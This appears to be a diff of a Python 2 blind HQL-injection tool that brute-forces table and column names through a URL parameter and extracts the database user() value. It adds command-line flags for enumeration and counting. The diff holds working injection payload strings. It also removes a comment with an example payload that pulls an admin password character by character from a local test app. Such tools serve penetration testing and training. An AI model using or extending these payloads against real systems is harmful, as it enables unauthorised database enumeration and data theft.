@@ -10,6 +10,7 @@ import re
 
 COOKIE = ""
 TABLES = {}
+USER = ""
 VERBOSE_MODE = False
 
 def send_HTTP_request(url, params):
@@ -77,7 +78,11 @@ def enumerate_tables_and_columns():
 def remove_new_line_from_string(string, char=''):
     return string[:-1] + char
 
-def blind_hqli_injection_tables(url, params, param_to_test, file_table, blind_hqli_message):
+###########################
+### Tables
+###########################
+
+def find_tables(url, params, param_to_test, file_table):
     global TABLES
 
     tables_to_test = []
@@ -95,44 +100,74 @@ def find_table(url, params, param_to_test, table_name):
     if (table_exists(req.content)):
         insert_table_name_in_tables(table_name)
     else:
-        display_message("[-] Table " + table_name + " does not exist.")            
+        print "[-] Table " + table_name + " does not exist."
 
-def blind_hqli_injection_columns(url, params, param_to_test, file_column, blind_hqli_message):
+###########################
+### Columns
+###########################
+
+def find_columns(url, params, param_to_test, file_column, table_name=None):
     global TABLES
 
     columns_to_test = []
     with open(file_column) as f:
         columns_to_test = f.readlines()
 
-    for table in TABLES:
+    if (table_name is None):        
+        for table in TABLES:
+            for column in columns_to_test:
+                # removing new line
+                column = remove_new_line_from_string(column)
+                find_column(url, params, param_to_test, table, column)
+    else:
         for column in columns_to_test:
             # removing new line
             column = remove_new_line_from_string(column)
-            params[param_to_test] = "'and (select count(w." + column + ") from " + table + " w) >= 0 or ''='"
-            
-            req = send_HTTP_request(url, params)
-            if (column_exists(req.content)):
-                insert_column_in_table(table, column)
-            else:
-                display_message("[-] Column " + column + " does not exist.")            
+            find_column(url, params, param_to_test, table_name, column)
+
+def find_column(url, params, param_to_test, table, column_name):
+    global TABLES
+
+    if (table not in TABLES):
+        find_table(url, params, param_to_test, table)
+        if (table not in TABLES):
+            raise Exception('Table ' + table + ' does not exist ?')
+            return
+
+    params[param_to_test] = "'and (select count(w." + column_name + ") from " + table + " w) >= 0 or ''='"
+    
+    req = send_HTTP_request(url, params)
+    if (column_exists(req.content)):
+        insert_column_in_table(table, column_name)
+    else:
+        print "[-] Column " + column_name + " does not exist." 
+
+###########################
+### Username
+###########################
 
 def get_dbms_username(url, params, param, message):
     global TABLES
+    global USER
 
     try:
         table_to_test = TABLES.items()[0][0]
     except:
         raise Exception('No tables found ?')    
     
-    #get the count of the table
+    display_message("Using " + table_to_test + " to retrieve user()")
+
+    # get the count of the table
     request = "' and (SELECT count(*) FROM " + table_to_test + ") "
     count_table = retrieve_count_or_length(url, params, param, message, request)
 
+    # get the length of the username
     request = "' and (SELECT length(CONCAT(COUNT(*), '/', USER())) FROM " + table_to_test + ") "
     count_user = retrieve_count_or_length(url, params, param, message, request)
 
-    display_message("Count table : " + count_table)
-    display_message("Count User : " + count_user)
+    length_user = int(count_user) - int(count_table)
+    display_message("Count of table  " + table_to_test + ": " + count_table)
+    display_message("Length of user() : " + str(length_user))
 
     i = len(str(count_table)) + 2
     username_str = ""
@@ -142,7 +177,8 @@ def get_dbms_username(url, params, param, message):
         username_str = username_str + chr(char)
         i = i + 1
 
-    print "Username of Database found : " + username_str
+    USER = username_str
+    print "[!] Username of Database found : " + USER
 
 
 def get_count_of_tables(url, params, param, message):
@@ -227,11 +263,6 @@ def display_message(message):
     if (VERBOSE_MODE):
         print message
 
-# Blind SQLi
-# http://localhost:9110/ropeytasks/task/search?q=%27and%20%28select%20substring%28password,1,1%29%20from%20User%20where%20username=%27admin%27%29%20%3E=%20%27p%27or%20%27%27=%27&search=Search
-# 'and (select substring(password,1,1) from User where username='admin') >= 'p'or ''='
-#SELECT COUNT(*) FROM   INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='TABLE';
-
 # option parser
 parser = optparse.OptionParser()
 parser.add_option('--url', help='qURL to pentest', dest='url')
@@ -244,6 +275,17 @@ parser.add_option('--fingerprinting', help='Gathers information by doing fingerp
 parser.add_option('--results', help='Enumerate results after session', dest='results', default=False, action='store_true')
 parser.add_option('--verbose', help='Verbose mode', dest='verbose', default=False, action='store_true')
 
+# Table options
+parser.add_option('--tables', help='Tries to gather as much tables as possible (With Bruteforce)', dest='tables', default=False, action='store_true')
+parser.add_option('--T', help='Name of the table you want to get', dest='table', default=None)
+
+# Column options
+parser.add_option('--columns', help='Tries to gather as much columns as possible (With Bruteforce)', dest='columns', default=False, action='store_true')
+parser.add_option('--C', help='Name of the column you want to get', dest='column', default=None)
+
+# Fingerprinting flag
+parser.add_option('--user', help='Tries to get user() from dbms', dest='user', default=False, action='store_true')
+parser.add_option('--count', help='Get count of specified table(s)', dest='count', default=False, action='store_true')
 # TODO: Check for mandatory parameters
 # mandatory params to check
 # mandatory_params = ['url', 'param']
@@ -260,8 +302,7 @@ else:
     params = opts.url.split('?')[1]
     params = dict( (k, v if len(v)>1 else v[0] ) 
            for k, v in urlparse.parse_qs(params).iteritems() )
-    # print params
-    # raw_input()
+
     if (opts.param not in params):
         raise Exception('Param not in URL!')
 
@@ -271,14 +312,52 @@ else:
     # list columns
     list_columns(url, params, opts.param)
 
-    # check if blind hql injection must be done
-    if (opts.blind_hqli_message is not None):
-        blind_hqli_injection_tables(url, params, opts.param, opts.file_table, opts.blind_hqli_message)
-        blind_hqli_injection_columns(url, params, opts.param, opts.file_column, opts.blind_hqli_message)
+    # --tables flag
+    if (opts.tables):
+        display_message("Trying to gather as much tables..")
+        find_tables(url, params, opts.param, opts.file_table)
 
-        if (opts.fingerprinting):
-            get_count_of_tables(url, params, opts.param, opts.blind_hqli_message)
-            get_dbms_username(url, params, opts.param, opts.blind_hqli_message)
+    # -T=<name> flag
+    if (opts.table):
+        display_message("Checking if " + opts.table + " exists.") 
+        find_table(url, params, opts.param, opts.table)
+
+    # --columns flag
+    if (opts.columns):
+        if (opts.tables):
+            display_message("Trying to find columns for all tables")
+            find_columns(url, params, opts.param, opts.file_column)
+        elif(opts.table is not None):
+            display_message("Trying to find columns for table " + opts.table)
+            find_columns(url, params, opts.param, opts.file_column, opts.table)
+        else:
+            print "ERROR : No table flag specified. "
+
+    # -C=<name> flag
+    if (opts.column):
+        if (opts.tables):
+            display_message("Trying to find column " + opts.column + " for all tables")
+            for table in TABLES:
+                print table
+                find_column(url, params, opts.param, table, opts.column)
+        elif(opts.table is not None):
+            display_message("Trying to find column " + opts.column + " for table " + opts.table)
+            find_column(url, params, opts.param, opts.table, opts.column)
+        else:
+            print "ERROR : No table flag specified. "
+
+    # --user flag
+    if (opts.user):
+        get_dbms_username(url, params, opts.param, opts.blind_hqli_message)
+
+    # --count flag
+    if (opts.count):
+        if (opts.tables):
+            get_count_of_table(url, params, opts.param, opts.blind_hqli_message)
+        elif(opts.table is not None):
+            get_count_of_table(url, params, opts.param, opts.blind_hqli_message, opts.table)
+        else:
+            print "ERROR : No table flag specified. "
 
     # enumerate tables and columns found if flag passed
     if (opts.results):
